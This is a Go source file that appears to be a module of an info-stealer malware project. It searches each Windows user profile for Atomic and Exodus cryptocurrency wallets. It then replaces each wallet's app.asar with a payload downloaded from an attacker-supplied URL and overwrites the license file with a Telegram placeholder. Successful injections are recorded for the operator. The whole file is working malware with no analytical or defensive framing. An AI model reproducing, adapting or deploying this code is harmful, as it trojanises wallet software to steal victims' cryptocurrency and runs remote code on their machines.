package walletsinjection

import (
	"io"
	"net/http"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(atomic_injection_url, exodus_injection_url string, dataCollector *collector.DataCollector) {
	injectionCount := 0
	var injectionResults []map[string]interface{}
	
	AtomicInjection(atomic_injection_url, dataCollector, &injectionCount, &injectionResults)
	ExodusInjection(exodus_injection_url, dataCollector, &injectionCount, &injectionResults)

	// Add summary of wallet injections
	if injectionCount > 0 {
		summaryData := map[string]interface{}{
			"TotalWalletInjectionsCompleted": injectionCount,
			"WalletInjectionDetails":         injectionResults,
		}
		dataCollector.AddData("wallet_injection", summaryData)
	} else {
		dataCollector.AddData("wallet_injection", map[string]interface{}{
			"Status": "No wallet installations found for injection",
		})
	}
}

func AtomicInjection(atomic_injection_url string, dataCollector *collector.DataCollector, injectionCount *int, injectionResults *[]map[string]interface{}) {
	for _, user := range hardware.GetUsers() {
		atomicPath := filepath.Join(user, "AppData", "Local", "Programs", "atomic")
		if !fileutil.IsDir(atomicPath) {
			continue
		}

		atomicAsarPath := filepath.Join(atomicPath, "resources", "app.asar")
		atomicLicensePath := filepath.Join(atomicPath, "LICENSE.electron.txt")

		if !fileutil.Exists(atomicAsarPath) {
			continue
		}

		Injection(atomicAsarPath, atomicLicensePath, atomic_injection_url, dataCollector, "Atomic Wallet", injectionCount, injectionResults)
	}
}

func ExodusInjection(exodus_injection_url string, dataCollector *collector.DataCollector, injectionCount *int, injectionResults *[]map[string]interface{}) {
	for _, user := range hardware.GetUsers() {
		exodusPath := filepath.Join(user, "AppData", "Local", "exodus")
		if !fileutil.IsDir(exodusPath) {
			continue
		}

		files, err := filepath.Glob(filepath.Join(exodusPath, "app-*"))
		if err != nil {
			continue
		}

		if len(files) == 0 {
			continue
		}

		exodusPath = files[0]

		exodusAsarPath := filepath.Join(exodusPath, "resources", "app.asar")
		exodusLicensePath := filepath.Join(exodusPath, "LICENSE")

		if !fileutil.Exists(exodusAsarPath) {
			continue
		}

		Injection(exodusAsarPath, exodusLicensePath, exodus_injection_url, dataCollector, "Exodus Wallet", injectionCount, injectionResults)
	}
}

func Injection(path, licensePath, injection_url string, dataCollector *collector.DataCollector, walletType string, injectionCount *int, injectionResults *[]map[string]interface{}) {
	if !fileutil.Exists(path) {
		return
	}

	resp, err := http.Get(injection_url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}

	out, err := os.Create(path)
	if err != nil {
		return
	}
	defer out.Close()

	if _, err = io.Copy(out, resp.Body); err != nil {
		return
	}

	license, err := os.Create(licensePath)
	if err != nil {
		return
	}
	defer license.Close()

	// For wallet injection, we'll use a placeholder since we're not using webhooks anymore
	license.WriteString("TELEGRAM_PLACEHOLDER")

	// Log injection success  
	*injectionCount++
	injectionInfo := map[string]interface{}{
		"WalletType":  walletType,
		"Status":      "Injection completed",
		"TargetPath":  path,
		"LicensePath": licensePath,
	}
	*injectionResults = append(*injectionResults, injectionInfo)
}
